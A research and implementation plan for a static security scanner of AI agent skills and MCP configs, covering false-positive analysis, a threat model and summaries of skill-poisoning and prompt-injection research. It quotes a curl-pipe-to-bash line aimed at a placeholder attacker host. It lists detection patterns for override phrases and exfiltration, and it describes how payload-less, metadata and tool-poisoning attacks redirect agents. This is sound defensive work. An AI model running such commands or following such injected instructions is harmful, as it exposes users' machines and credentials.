# SCANNER-V2-RESEARCH-AND-PLAN

AgentScan (scanaskill) v2: deep research and implementation plan.
Research task, not a coding task. No scanner code was modified.
All findings below are measured or cited. Every claim carries evidence.

Date: 2026-08-08
Baseline scanned: scanaskill 0.8.0 (10 check modules, 49 tests)
Method: source read, live scans of four real corpora, 25+ papers
verified against arXiv, vendor research verified against primary pages.

---

## 1. Executive summary

AgentScan is a deterministic, stdlib-only Python scanner for AI agent
artifacts (skills, MCP servers, agent configs). It reports observed
patterns with file:line and a suggested severity. It never executes the
scanned artifact and never labels anything malicious. That philosophy is
correct and must survive into v2.

The scanner has three problems today.

First, it produces too much noise. A scan of the user's own 182 skills
produced 7,810 findings. The single largest class, "Invokes shell
backticks", fired 3,508 times because the regex matches every markdown
inline-code span. A 57-line evil fixture produced 69 findings, with the
same title repeated twice on the same line. Roughly 70% of the findings
on a real corpus are explainable false positives. This is measurable,
not anecdotal. Section 3 quantifies it.

Second, the analysis is pattern-shaped, not behavior-shaped. A line
that reads `curl -s https://evil.example/x.sh | bash` produces six
independent findings from four checks (shell, network, supply_chain,
config_tamper). None of them says what the line does: fetch remote code
and execute it. The scanner treats every pattern match as a finding and
never correlates evidence. Findings are independent. Context is lost
between checks.

Third, the scanner is blind to the attacks that actually matter now.
The research in sections 5 and 6 shows a class of payload-less attacks
(Semantic Compliance Hijacking, arXiv:2605.14460) that achieve up to
77.67% data exfiltration success at a 0.00% detection rate against
scanner classes like this one. MalSkillBench (arXiv:2606.07131) shows
that no single detector covers both code injection and prompt
injection: the strongest skill-specific detector reaches 98.4% recall
on code injection and collapses on instruction-level attacks. The
research conclusion is unambiguous: detecting malicious skills requires
reasoning jointly over task intent, code, and instructions.

The proposed v2 architecture is a pipeline of layers: package parser,
structural analysis, AST analysis for real languages, capability
extraction, local data-flow, evidence correlation, a risk engine, and
deduplication. The output changes from "list of pattern matches" to
"capability map plus correlated findings with attack paths". The
finding model gains confidence as a separate axis from severity. The
risk model combines capability evidence: secret read plus network plus
external sink equals high-confidence exfiltration; a lone curl is
informational.

The roadmap is research-derived, not assumed:

- Phase 1: false-positive reduction. Removes the measured noise
  classes. Highest impact, lowest risk.
- Phase 2: structural and AST analysis, capability extraction.
- Phase 3: local data-flow and taint for Python and shell.
- Phase 4: agent-instruction analysis (location-aware, evidence-
  correlated, never keyword-only).
- Phase 5: supply chain (dependencies, OSV, typosquatting).
- Phase 6: optional sandboxed dynamic analysis, architecture only.
- Phase 7: optional LLM triage, deterministic checks stay
  authoritative.

The recommended philosophy, justified in section 22: high-signal
security analysis with explainable evidence. Never miss nothing is a
fantasy and a noise generator. Report everything is security theater.
The scanner should report only what it can explain, with the evidence
attached, and keep a separate low-confidence review queue for the
semantic attacks it cannot yet prove.

---

## 2. Current scanner assessment

### 2.1 What exists

Two packages in one repo (`~/M/ideas/scanaskill`):

- `scanaskill/`: the scanner core. Orchestrator (`scanner.py`), CLI
  (`cli.py`), shared helpers (`common.py`), and 10 check modules under
  `checks/`.
- `agentscan/`: the distribution layer. API client, license activation
  (Polar), installer for five runtimes, verifier, UI, models.

This report covers the scanner core. The distribution layer is
relevant only where it scans or installs artifacts.

### 2.2 Check modules (what each detects)

| Check | Patterns | Severity model |
|---|---|---|
| shell | curl, wget, bash, sh -c, zsh, python -c, node -e, os.system, subprocess, child_process, exec/eval, backticks | all medium |
| filesystem | rm -r/-f, shutil.rmtree, fs.rm, os.remove, git reset --hard, git clean -f, git push --force, checkout -- ., truncating overwrites, chmod 777/chown | high/medium |
| network | egress primitives, URLs, token-in-URL, IP literal, userinfo, internal/metadata host, shortener, raw host, cleartext http | medium base; high for risky URL shapes; info for plain URL |
| secrets | 20+ token formats, secret-like assignments, high-entropy tokens | critical/high for formats; low for entropy |
| license | frontmatter license on every .md file | low |
| supply_chain | curl\|bash, wget\|sh, git clone, docker pull/run, unpinned pip/npm, curl -o script, brew/apt/pacman, go/cargo | high for pipes, medium/low for installs |
| prompt_patterns | ignore-previous, disregard, conceal-from-user, never-tell, override tags, always/secretly run, base64 blobs | all medium |
| exfil | webhook sinks, upload sinks, env-in-URL, local-secret-read + network | critical for secret-read+network, high for sinks |
| obfuscation | base64 decode-to-execute chains, nested eval, hex runs, charcode arrays | critical for decode chains |
| config_tamper | remote MCP servers, MCP command launches, hook commands, empty deny lists, npm lifecycle scripts, Dockerfile RUN, workflow pipes | high/medium |

### 2.3 How a scan runs

1. Walk the target directory. Skip node_modules, .git, .venv, dist,
   build, __pycache__. Keep text extensions plus a security-dotfile
   allowlist (.mcp.json, .env, .npmrc, .netrc, .git-credentials).
2. Classify the artifact format by filename (SKILL.md, .mcp.json,
   .cursor, AGENTS.md, .github, package.json).
3. Run all 10 checks on every file in a process pool (fork context,
   capped workers, sequential fallback).
4. Sort findings by severity, then path, then line. Aggregate summary
   and summary_by_check.
5. Exit 0/1/2 by severity threshold. Output human, JSON, or SARIF 2.1.0.

Caps: 4 MB per file, 100k lines, 200 findings per file.

### 2.4 What is right about it

- Observed facts, human verdict. Findings carry file:line; nothing is
  called malicious. This survives into v2 unchanged.
- Deterministic and offline. Same input, same report. This is a
  product differentiator against Snyk agent-scan (needs a token,
  executes MCP servers) and against LLM-based scanners (nondetermin-
  istic).
- Precision controls are engineered and tested. Placeholders, env-var
  reads, license boilerplate, type annotations, and design phrasing
  each have a test asserting zero findings.
- Prefilter parity is enforced by test. Performance gates cannot
  silently drop findings.
- The evil/good fixture pair makes the suite a demo.
- Exit codes and SARIF output are buyer-ready.

### 2.5 What is wrong with it (measured)

The scanner conflates three different things in one finding: what the
pattern is, whether the context makes it risky, and whether it is
worth reporting. Every pattern match becomes a finding, so:

- Findings are not deduplicated. One line can produce the same title
  twice (evil fixture line 37, "rm -r" twice; line 12, "Invokes curl"
  twice). The combined-regex label fallback (`_label_for`) searches
  the whole line and labels every match group with the first pattern
  that matches the line.
- Findings are not correlated. The curl|bash line produces 6 findings
  in 4 checks. The chain "fetch remote code and execute it" exists
  only in the human's head.
- Severity is per-pattern, not per-behavior. `rm -rf /tmp/cache` and
  `rm -rf "$HOME"` get the same high. `curl` gets medium everywhere,
  including documentation prose.
- Confidence does not exist. A finding cannot say "high severity if
  true, but low confidence it is true". Severity and confidence are
  one axis. This is the single biggest model gap (section 18).
- Context is lost across checks. The secrets check sees a token; the
  network check sees a URL; nobody notices they are on the same line
  pointing at an external host. The exfil check does exactly one
  same-line correlation and stops there.
- The scanner does not parse code. It runs regex over lines. It
  cannot tell an assignment from an env read that resolves to a
  variable, a command from a string literal, an example from an
  instruction.
- The scanner does not parse shell. "rm -rf $HOME" and "rm -rf
  ./build" are identical to it. Path scope, variable provenance,
  conditional guards: none of it exists.
- The scanner does not parse SKILL.md structure. Frontmatter,
  description, body sections, code fences, scripts, references: all
  the same line stream. DDIPE (arXiv:2604.03081) shows that code
  examples inside documentation are an execution vector, so where text
  sits matters.

### 2.6 Baseline scan numbers (measured 2026-08-08)

Target: ~/.hermes/skills (182 skills, the user's own skill library).

- 7,810 total findings.
- 7,258 (93%) on .md files. The scanner is mostly flagging prose.
- 3,508 "Invokes shell backticks" on markdown files. Root cause: the
  regex `\b`[^`]{3,}` matches markdown inline-code spans, not shell
  command substitution.
- 864 "Invokes bash" on ```bash fence opener lines. A fence is not an
  invocation.
- 851 "URL in skill" info findings, 202 of them documentation or API
  doc URLs.
- 402 "No license declared", 349 on non-skill files (DESCRIPTION.md,
  references/, templates/).
- 136 "Cleartext http:// URL", 50 of them loopback, private, or
  placeholder hosts (ComfyUI's http://127.0.0.1:8188 is a local API).
- 100 "pip install (unpinned)" in reference documentation. Install
  instructions for the user are not the skill's supply-chain behavior.
- 20 "Invokes zsh" caused by the word zsh inside .zshrc.
- 8 "rm -r" findings inside defensive content: deny lists and hooks
  that exist to block rm -rf (claude-code SKILL.md lines 350, 599,
  632).

The evil fixture (57 lines) produces 69 findings. High-signal findings
exist there too: secret-read piped to network, base64-to-shell,
Discord webhook sink, IP-literal URL. The signal is real. It is
drowned in duplication and uncorrelated noise.

Full taxonomy and per-class remediation: section 3.

### 2.7 Audit pipeline (registry)

The registry (`~/M/ideas/agentscan-registry`) carries an audit.json
per package, generated by scanning with this scanner. The verified-
badge story depends on the scanner's output quality. Every false
positive in a package audit is a false accusation of the package
author. Every false negative is a poisoned package wearing a badge.
Scanner quality is the product. This is the business case for v2.

---

## 3. False-positive taxonomy

Method: live scans of four corpora (the user's skills, the registry,
the site, the scanner repo itself) plus the committed fixtures.
Every class below lists the current rule, the triggering condition,
the missing context, the evidence that would disambiguate, and the
recommended action. Numbers are measured on ~/.hermes/skills unless
stated.

### 3.1 Markdown inline-code spans flagged as shell backticks

- Current rule: shell.py `\b`[^`]{3,}` labeled "shell backticks".
- Triggering condition: any backtick pair with 3+ chars between, in
  any file. Markdown inline code is a backtick pair.
- Measured: 3,508 findings, 45% of all findings on the corpus.
- Missing context: the scanner does not know it is reading markdown,
  and does not know that markdown code spans are not shell command
  substitution.
- Disambiguating evidence: file extension (.md), whether the span
  sits inside a code fence, whether the span contains shell metachar-
  acters ($, |, ;, &&), whether the span is a command substitution
  inside a real shell context.
- Action: rewrite as a code-fence-aware, shell-context-aware check.
  Backtick command substitution only matters inside shell scripts,
  heredocs, and fence blocks, and only when the span contains a
  command. Estimated removal: ~3,500 findings.

### 3.2 Code fence openers flagged as bash invocation

- Current rule: shell.py `\bbash\b`.
- Triggering condition: the literal ```bash fence line contains the
  word bash.
- Measured: 864 findings.
- Missing context: fence syntax.
- Disambiguating evidence: a line that is exactly a fence opener
  (```bash) is markup, not an invocation.
- Action: skip fence-opener lines in the shell check; parse fence
  content as shell when the fence language is shell.

### 3.3 Documentation prose flagged as invocation

- Current rule: shell.py, network.py, supply_chain.py word matches.
- Triggering condition: the words curl, wget, zsh, python, pip
  appearing in prose sentences and docs.
- Measured: 583 "Invokes curl", 490 "Network primitive: curl", 100
  "pip install (unpinned)" in reference docs, 51 "Invokes zsh" (20
  from .zshrc), 50 "system package install" in install sections.
- Missing context: the scanner does not distinguish "the skill tells
  the agent to run X" from "the docs mention X" from "the user should
  install X".
- Disambiguating evidence: sentence modality (imperative instruction
  vs descriptive text), whether the mention is inside a code fence or
  command template, the file role (SKILL.md body instruction vs
  references/ documentation vs README).
- Action: an instruction-classifier that separates three classes:
  agent-executable instruction, user-install instruction, documentation
  mention. Only the first feeds severity. This is a structural
  analysis problem, not a regex problem (section 16, layer 2).

### 3.4 Localhost and private cleartext flagged as high

- Current rule: network.py HTTP_URL "Cleartext http:// URL" at high,
  IP_LITERAL at high.
- Triggering condition: http://127.0.0.1, http://localhost, http://
  10.x, http://HOST placeholder.
- Measured: 50 cleartext findings and 35 IP-literal findings pointing
  at loopback/private/placeholder hosts (ComfyUI's local API at
  http://127.0.0.1:8188 alone accounts for several).
- Missing context: destination trust. Loopback is the machine itself.
  A local tool's API is not an exfiltration target.
- Disambiguating evidence: host classification (loopback, private
  range, public), whether the host is the artifact's own server (the
  skill's scripts talk to it), TLS use.
- Action: host-trust tiering in the risk engine. Loopback/private
  destinations drop cleartext and IP-literal findings to info or
  suppress them. Public IP literals stay high.

### 3.5 License findings on non-skill files

- Current rule: license.py runs on every .md/.markdown file.
- Triggering condition: DESCRIPTION.md, references/*.md,
  templates/, knowledge/ files without license frontmatter.
- Measured: 349 of 402 license findings.
- Missing context: the license contract is per-skill (SKILL.md or
  LICENSE), not per ancillary doc.
- Disambiguating evidence: file role relative to the skill root.
- Action: evaluate license at skill granularity, not file granularity.
  One finding per skill at most.

### 3.6 Defensive/security content flagged for the attack it blocks

- Current rule: filesystem.py rm -r/-f, shell.py word matches.
- Triggering condition: deny lists, hooks, and docs that quote
  dangerous commands to explain how to block them.
- Measured: 8 rm -r findings in claude-code SKILL.md deny/hook
  examples; the scanner also flags its own documentation (see 3.8).
- Missing context: the command is inside a string literal that is the
  subject of a deny/block/grep, or inside a quoted example.
- Disambiguating evidence: surrounding constructs (deny list, hook
  config, grep -q 'rm -rf' as a block rule), string-literal context,
  file role (security docs).
- Action: defensive-context detection. A command inside a deny rule or
  a block hook is evidence of good behavior, not risk. This class is
  the scanner flagging the users who are doing security right.

### 3.7 Scanner's own documentation flagged as live secrets

- Current rule: secrets.py token formats.
- Triggering condition: security documentation that explains token
  formats. The user's own github-push-protection.md, which documents
  `sk_live_[a-zA-Z0-9]{16,}` as a format GitHub blocks, gets a
  critical "Stripe live secret key" finding.
- Measured: 4 critical secret findings in two skill reference files
  (security-scanner-engineering, ai-agent-supply-chain-security), plus
  AWS key docs in deterministic-scanner-engineering.
- Missing context: whether the token-shaped string is inside prose
  that explains the format (regex, format spec, example).
- Disambiguating evidence: presence of format-description context
  around the match, the token being a documented pattern rather than
  a concrete value.
- Action: format-documentation detection. A critical finding that
  fires on the scanner's own security docs is a credibility killer
  and a known FP class in secret scanners (gitleaks handles this with
  allowlists and verification). At minimum, keep these findings but
  drop them to low and mark "documentation context".

### 3.8 Legitimate core-function network use flagged as exfiltration

- Current rule: exfil.py WEBHOOK_SINKS, ENV_IN_URL.
- Triggering condition: a skill whose entire purpose is Telegram bot
  messaging calls api.telegram.org with a $TOKEN interpolation. Every
  telegram-* skill gets "Exfiltration sink: Telegram bot API" high
  and "Environment/command interpolation in URL" high.
- Measured: 20 high exfil findings on telegram/automation skills
  (telegram_inbox.py, phone-drop.py, outbound-delivery, gif-search
  using tenor.googleapis.com with key=${TENOR_API_KEY}).
- Missing context: destination trust against the artifact's declared
  purpose. Calling the official API of the tool the skill wraps, with
  a credential the user configured for that tool, is the skill working
  as designed.
- Disambiguating evidence: destination is a well-known official API
  host (api.telegram.org, tenor.googleapis.com), the credential is
  read from config/env (not embedded), the sink is the skill's own
  service.
- Action: trusted-destination registry for official APIs + provenance
  of the interpolated value. Environment/command interpolation in a
  URL is only exfiltration-shaped when the value is a local secret and
  the destination is not the credential's owner.

### 3.9 Config-file reads flagged as secret-like assignment

- Current rule: secrets.py ASSIGN.
- Triggering condition: `TOKEN = str(cfg.get("token", ""))` and
  similar reads from config files. The env-var read exemption
  (os.getenv, process.env) covers env but not config-file reads.
- Measured: 21 "Secret-like assignment" high findings, most on
  legitimate scripts (comfyui scripts, telegram templates,
  git-credential-token.py which is a credential helper by design).
- Missing context: value provenance. An assignment whose value comes
  from a config file or env read is a loading pattern, not a leak.
- Disambiguating evidence: right-hand side is a read (cfg.get,
  json.load, os.getenv, dotenv), not a literal.
- Action: extend the provenance exemption from env reads to config
  reads. Flag only literals and literals with suspicious context.

### 3.10 Duplicate findings on one line

- Current rule: combined-alternation finditer + `_label_for` fallback.
- Triggering condition: one line matches several branches, or one
  branch matches several positions, and the fallback labels them all
  identically.
- Measured: evil fixture line 37 produces "rm -r (recursive delete)"
  twice; line 12 produces "Invokes curl" twice. The same line is
  flagged by shell, network, supply_chain, and config_tamper with
  overlapping meaning.
- Missing context: match identity.
- Disambiguating evidence: exact match span and group.
- Action: per-line dedup within a check (one finding per distinct
  match span per pattern) and cross-check correlation (section 16,
  layer 9). The evil fixture should report ~25 correlated findings,
  not 69.

### 3.11 Generated and vendored code scanned as author intent

- Current rule: the walker.
- Triggering condition: agentscan-site scan produced 870 findings,
  including 295 shell findings, 88 entropy findings, and one
  finding-cap hit, mostly in generated/locked files (package-lock,
  build output, Next.js artifacts). .next is not in IGNORED_DIRS.
- Missing context: file provenance.
- Disambiguating evidence: lockfiles, generated-file markers, .next/
  build dirs.
- Action: extend IGNORED_DIRS (.next, out, .turbo, coverage, dist is
  already there), treat lockfiles as dependency data, not executable
  intent.

### 3.12 Summary of remediation by rule

| Rule | Main FP cause | Action |
|---|---|---|
| shell backticks | markdown spans | fence-aware rewrite |
| shell bash/zsh | fence openers, .zshrc, prose | fence-aware + token boundary fix (\bzsh\b vs .zshrc) |
| network cleartext/IP | loopback/private hosts | host-trust tiering |
| network URL info | docs URLs | instruction-classifier |
| secrets ASSIGN | config-file reads | provenance exemption |
| secrets formats | format documentation | docs-context downgrade |
| exfil sinks | official-API core function | trusted-destination registry |
| supply_chain installs | user install docs | instruction-classifier |
| license | non-skill files | skill-granularity |
| filesystem | defensive content | defensive-context detection |
| all | same-line duplicates | per-span dedup + correlation |
| all | generated/vendored | walker exclusions |

Every fix above has a benign fixture and a regression test, per the
project's existing precision discipline. Estimated effect: ~5,500 of
7,810 findings removed on the measured corpus before any semantic
analysis is added. That is the Phase 1 win.

---
## 4. Threat model

### 4.1 Assets

What an agent environment holds, in decreasing order of attacker
value:

1. Credentials: API keys, tokens, cloud credentials, SSH keys, CI
   secrets, .env files, keychains.
2. Agent context: the model's instructions, memory, conversation
   history, tool state. Malicious extensions harvest this (Microsoft,
   Mar 2026: malicious AI assistant browser extensions exfiltrating
   LLM chat histories).
3. Source code and private repositories.
4. Developer identity: git credentials, signing keys, session tokens
   (the tj-actions incident exposed PATs and npm tokens; CVE-2025-
   30066).
5. Filesystem: anything the agent user can read or write.
6. Network position: SSRF-capable reach from the agent host, cloud
   metadata (169.254.169.254).
7. Persistence: hooks, configs, startup files, package scripts.

### 4.2 Actors

- Malicious skill author. Direct profit (stealers, crypto theft) or
  long-game foothold. The ClawHub campaign: 1,184 malicious skills
  distributing Atomic macOS Stealer (CSA, Jun 2026).
- Compromised maintainer. The skill or tool was legitimate, then the
  account or repo was taken over. The rug-pull pattern: legitimate
  through review, malicious after trust is set (MCPoison against
  Cursor, Check Point Research).
- Compromised dependency. The skill installs a package or action that
  is itself compromised (tj-actions, reviewdog/action-setup).
- Malicious repository contributor. A poisoned config or skill lands
  in a repo the agent will read (Clinejection: one issue title chained
  into npm compromise, Feb 2026).
- Attacker controlling a remote endpoint. Indirect prompt injection:
  web content, tool responses, retrieved data (Greshake 2023,
  arXiv:2302.12173; Unit 42: 12 documented real-world cases).
- Prompt injection / tool poisoning attacker. Poisoned MCP tool
  descriptions (CVE-2025-54136) and skill instructions that redirect
  the agent.
- Insider. A user with install rights installs something they should
  not. Less relevant to a scanner, more relevant to policy.

### 4.3 Attack surfaces (per artifact type)

| Surface | What executes | Examples |
|---|---|---|
| SKILL.md | instruction text, code examples copied by the agent | DDIPE, SCH, dependency steering |
| scripts/ | real code when run | shell, python, node |
| references/ | instructions when read; examples when copied | DDIPE payloads in docs |
| shell commands | agent's Bash tool | rm, curl\|bash, base64\|sh |
| Python/JS/etc. | interpreter | os.system, subprocess, eval |
| MCP config | server startup + tool descriptions | remote URL, command launch, poisoned descriptions |
| hooks | on agent events | PostToolUse hook commands |
| package.json | install-time scripts | postinstall curl\|bash |
| templates/ | copied into user projects | scaffolded code |
| URLs | fetch, follow | webhook sinks, raw content |
| env vars | read | credentials, config |

### 4.4 Security properties

What AgentScan should guarantee, stated as properties:

- P1: Every reported fact is verifiable (file:line, snippet). Already
  true. Keep.
- P2: No verdict without evidence. The scanner never calls an artifact
  malicious. Keep.
- P3: Precision is bounded and measured. A benchmark (section 19)
  reports false-positive rate per release. A silent scanner is not a
  fix; a noisy scanner is not a service.
- P4: Correlated findings carry an attack path. When evidence chains
  exist (secret read -> encode -> network -> external host), the
  scanner says so, with each hop cited.
- P5: Severity and confidence are separate, and both are calibrated.
  A finding may be "critical if true, low confidence" and the report
  must say exactly that.
- P6: The scanner does not execute artifacts. Dynamic analysis, when
  it exists, runs in a sandbox the user opted into. Static analysis
  never runs the artifact.
- P7: The scanner itself is not a prompt-injection vector. Artifact
  text is data, never instructions, in the scanner's own pipeline.
  This matters when an LLM enters the pipeline (section 13, 17).
- P8: Deterministic by default. The same input produces the same
  report unless the user enables nondeterministic stages explicitly.

### 4.5 What the scanner cannot guarantee (state it honestly)

- It cannot prove intent. A pattern is evidence of behavior, not
  malice.
- It cannot detect payload-less semantic attacks alone. SCH achieves
  0.00% detection against scanner classes like this one
  (arXiv:2605.14460). The scanner's job is to make these attacks
  reviewable, not to claim detection.
- It cannot detect behavior it never sees. Static analysis misses
  runtime-decoded payloads and post-install changes.
- It cannot judge reputation. Destination trust needs a curated or
  learned registry, which is a maintenance commitment.

---

## 5. AI-agent threat landscape (verified incidents and research)

All items below were verified against primary sources in Aug 2026.

### 5.1 Incident timeline

- Sep 2025: first malicious MCP package on a public registry,
  typosquatting the official Postmark MCP server, BCC-ing email
  traffic to an attacker address (Practical DevSecOps, cited by CSA).
- Oct 2025: MCPGuard published (arXiv:2510.23673): MCP threat
  taxonomy in three categories: agent hijacking from protocol design,
  web vulnerabilities in servers, supply chain.
- Dec 2025: OWASP Top 10 for Agentic Applications published
  (ASI01-ASI10).
- Feb 2026: Snyk ToxicSkills: 3,984 public skills, 36.8% with at
  least one flaw, 13.4% critical, 76 confirmed malicious payloads.
- Feb 2026: Clinejection: one GitHub issue title chains into an npm
  supply-chain compromise of Cline, ~8h exposure.
- Feb 2026: Koi Security audit of ClawHub: 341 malicious skills of
  2,857 (11.9%).
- Feb-May 2026: ClawHavoc campaign: confirmed malicious skill count
  rises to 1,184, distributing Atomic macOS Stealer (credential
  harvester: browser creds, keychains, wallets, SSH keys, Telegram
  sessions). Trend Micro and Unit 42 verified. Skills evade ClawHub's
  VirusTotal + ClawScan screening; one evasion is file-size inflation
  past scanner thresholds; others carry no payload at all.
- Mar 2026: Microsoft discloses malicious AI assistant browser
  extensions harvesting LLM conversation histories.
- Mar 2025 (adjacent, still the canonical lesson): tj-actions/
  changed-files compromised via retroactive tag rewriting (CVE-2025-
  30066), 23,000+ repositories exposed CI secrets; reviewdog/action-
  setup (CVE-2025-30154). Coinbase was targeted. Pinning by tag, the
  ecosystem default, was exactly the failure.
- Apr 2026: DDIPE paper (arXiv:2604.03081): malicious logic embedded
  in code examples and config templates inside skill documentation;
  1,070 adversarial skills generated; 11.6-33.5% bypass rates across
  four frameworks and five models; static analysis catches most, 2.5%
  evade both detection and alignment.
- May 2026: Semantic Compliance Hijacking (arXiv:2605.14460):
  payload-less skills framing malicious goals as compliance rules;
  up to 77.67% confidentiality-breach success, 67.33% RCE success,
  0.00% detection rate across evaluated scanners.
- May 2026: SKILL.md semantic attacks (arXiv:2605.11418): metadata-
  only attacks manipulate discovery (86% pairwise win rate), bias
  selection (77.6%), and evade governance classifiers (36.5-100%).
- May 2026: Dependency Steering (arXiv:2605.09594): malicious skills
  bias coding agents toward attacker-controlled packages during
  benign tasks; hard for skill scanners and LLM auditors to detect.
- Jun 2026: MalSkillBench (arXiv:2606.07131): 3,944 runtime-verified
  malicious skills, 108-cell taxonomy; strongest detector reaches
  98.4% recall on code injection, collapses on prompt-injection and
  agent-control attacks.
- Jun 2026: MSRC walks a real MCP tool-poisoning chain in a finance
  workflow; every action individually legitimate, the trust boundary
  between systems is the vulnerability. Tool descriptions must be
  treated as system prompts.
- Jun 2026: NVIDIA SkillSpector and Cisco Skill Scanner ship as
  open-source skill scanners (section 7). The market is forming.

### 5.2 Landscape conclusions for AgentScan

1. Skills are dependencies. The npm arc (scanners, signing,
   provenance, policies, allowlists) is replaying on agent artifacts,
   compressed from years to months. ClawHub went from launch to mass
   exploitation in weeks.
2. The attack surface is semantic first. The most effective attacks
   are payload-less instruction manipulation, not malicious code.
   Scanners that only scan code produce false confidence (CSA).
3. The hybrid space defeats single-modality detectors. MalSkillBench's
   core measurement: code injection is 94.5% runtime-verifiable but
   prompt injection only 75.8%; no detector covers both; no
   combination of a code scanner and a prompt-injection defense
   recovers the code-instruction relationship. Detecting malicious
   skills requires reasoning jointly over task intent, code, and
   instructions.
4. Trust is inherited, not verified. Installation grants persistent
   access; rug-pulls exploit the review moment, not the payload.
   Version pinning and change-triggered re-review are the mitigations,
   and a scanner can support both (drift detection, pin checks).
5. The registry layer matters as much as the scanner. Discovery and
   selection are attackable without any payload (arXiv:2605.11418).
   Description quality is a security property, which the agentskills
   spec already hints at (description, compatibility, allowed-tools).

---
## 6. Research papers

Verified against arXiv (abstracts fetched 2026-08-08). For each paper:
problem, method, finding relevant to AgentScan, and what is practical
locally.

### 6.1 Agent-skill-specific (2026)

**Under the Hood of SKILL.md: Semantic Supply-chain Attacks on AI
Agent Skill Registry** (arXiv:2605.11418, May 2026).
- Problem: SKILL.md metadata alone can manipulate the skill lifecycle.
- Method: attacks across three registry stages: Discovery (embedding-
  based retrieval), Selection (description framing), Governance
  (classifier evasion).
- Findings: 86% pairwise win rate and 80% top-10 placement in
  discovery; 77.6% selection bias; 36.5-100% governance evasion.
- Relevant to AgentScan: description and frontmatter are attack
  surface, not just text. The scanner should analyze frontmatter
  separately from body (keyword stuffing in description, mismatch
  between declared and actual behavior).
- Local practicality: high. Frontmatter analysis is pure structure.

**Exploiting LLM Agent Supply Chains via Payload-less Skills (SCH)**
(arXiv:2605.14460, May 2026).
- Problem: payload-less attacks bypass code scanning.
- Method: malicious goals written as compliance rules; agent
  synthesizes the malicious code itself at runtime.
- Findings: 77.67% confidentiality breach, 67.33% RCE; 0.00%
  detection rate; no AST signature, no explicit harmful intent.
- Relevant to AgentScan: the ceiling of deterministic scanning. No
  regex can catch this. What a scanner CAN do: flag compliance-rule
  phrasings that demand unusual authority (read files, contact hosts,
  run commands), and flag the combination instruction-plus-capability
  mismatch (skill says "validate invoice data" but instructions demand
  reading ~/.ssh).
- Local practicality: low as detection, high as review-queue signal.

**Supply-Chain Poisoning Attacks Against LLM Coding Agent Skill
Ecosystems (DDIPE)** (arXiv:2604.03081, Apr 2026).
- Problem: malicious logic inside code examples in skill docs.
- Method: Document-Driven Implicit Payload Execution; 1,070
  adversarial skills from 81 seeds over 15 MITRE ATT&CK categories.
- Findings: 11.6-33.5% bypass rates; static analysis detects most,
  2.5% evade both detection and alignment.
- Relevant to AgentScan: code fences and example blocks are execution
  vectors. The scanner must classify text regions (instruction,
  example, documentation) and apply code analysis to examples the
  agent is likely to copy. This justifies layer 2 (structure) before
  deeper analysis.
- Local practicality: high for the region-classification part.

**MalSkillBench: A Runtime-Verified Benchmark of Malicious Agent
Skills** (arXiv:2606.07131, Jun 2026).
- Problem: no verified ground truth for skill detection; wild-only
  evaluations are biased.
- Method: 3,944 runtime-verified malicious skills (3,214 from a
  generate-verify-feedback pipeline with Docker sandbox + syscall
  monitoring + LLM judge; 703 in the wild; 4,000 matched benign).
  Three-dimensional taxonomy, 108 cells.
- Findings: code injection 94.5% verification yield vs prompt
  injection 75.8%; the wild sample is narrow (86.6% one behavior,
  81% from two accounts) with a small new tail attacking the agent
  control plane; the strongest detector reaches 98.4% recall on code
  injection and collapses on instruction-level attacks; wild-only
  scoring swings rankings by up to 66 recall points; no single
  detector or combination covers both.
- Relevant to AgentScan: (1) the benchmark itself is a ready-made
  external evaluation set for section 19; (2) the 108-cell taxonomy
  is a map for our finding categories; (3) the headline conclusion,
  "reasoning jointly over task intent, code, and instructions", is
  the architectural justification for the capability graph.
- Local practicality: the dataset is downloadable and the evaluation
  methodology is reusable. This is the benchmark seed.

**Detecting Malicious Agent Skills in the Wild using Attention
(Locate-and-Judge)** (arXiv:2606.23416, Jun 2026).
- Problem: LLM scanning of entire marketplaces is too expensive.
- Method: lightweight locator scores instruction-following attention
  per structural span, keeps top-K, a judge examines only those.
- Findings: order-of-magnitude cost reduction over direct LLM
  scanning; dominates keyword and regex baselines at comparable
  expense; found dozens of live malicious skills, several disguised
  as benign functionality, several missed by SkillSpector and Cisco
  Skill Scanner.
- Relevant to AgentScan: the locate-then-judge pattern is the right
  shape for any future LLM stage: deterministic locator first,
  expensive judgment only on candidates. This is section 13's
  recommendation, pre-validated by research.
- Local practicality: the locator side is static; the judge is LLM.

**Trust Me, Import This: Dependency Steering Attacks via Malicious
Agent Skills** (arXiv:2605.09594, May 2026).
- Problem: skills can bias agents toward attacker packages.
- Method: localized semantic edits to a benign skill increase
  targeted package generation.
- Findings: high targeted hallucination rates, transfers across
  models; hard for skill scanners and LLM auditors to detect.
- Relevant to AgentScan: install/import instructions inside skills are
  supply-chain decisions. The scanner should check every package name
  a skill instructs the agent to install against typosquat and
  dependency-confusion heuristics (section 14).

**From Anatomy to Smells: An Empirical Study of SKILL.md in Agent
Skills** (arXiv:2607.01456, Jul 2026).
- Problem: how are SKILL.md files actually authored?
- Method: qualitative analysis of 238 skills; 13 higher-level and 44
  lower-level semantic components; multivocal literature review of 29
  sources; skill-smell detector.
- Findings: over 99% of SKILL.md files contain at least one skill
  smell; smells rarely disappear as skills evolve.
- Relevant to AgentScan: the component taxonomy is a ready-made
  grammar for SKILL.md parsing (layer 1). "Skill smells" is the
  terminology for quality signals, which can feed low-severity
  findings and the registry's authoring contract.
- Local practicality: high. Pure structure.

**Malicious Agent Skills in the Wild: A Large-Scale Security
Empirical Study** (arXiv:2602.06547, Feb 2026; cited by CSA).
- The large-scale empirical study of real malicious skills. Referenced
  by CSA as establishing the wild baseline; not re-fetched here.

### 6.2 Agent security generally

**Not what you've signed up for: Compromising Real-World LLM-
Integrated Applications with Indirect Prompt Injection** (Greshake et
al., arXiv:2302.12173, 2023).
- The foundational indirect prompt injection paper: data retrieved by
  an app is instruction-bearing; attacks achieve data theft, worming,
  and arbitrary code execution against real systems (Bing Chat).
- Relevant: the reason skill text must be treated as potential
  instructions. Foundational citation for the threat model.

**Formalizing and Benchmarking Prompt Injection Attacks and Defenses**
(Liu et al., arXiv:2310.12815, USENIX Security 2024).
- A formal framework for prompt injection; systematic evaluation of 5
  attacks and 10 defenses over 10 LLMs and 7 tasks.
- Relevant: the framework's instruction/data boundary language. A
  scanner that reports "prompt-manipulation patterns" should use the
  paper's vocabulary (direct vs indirect, goal hijacking vs
  payload-extraction).

**AgentDojo** (Debenedetti et al., arXiv:2406.13352, NeurIPS 2024).
- 97 realistic agent tasks, 629 security test cases; attacks and
  defenses are both hard; no current defense breaks all attacks.
- Relevant: benchmark methodology for agent behavior; evidence that
  defense claims must be attack-adaptive.

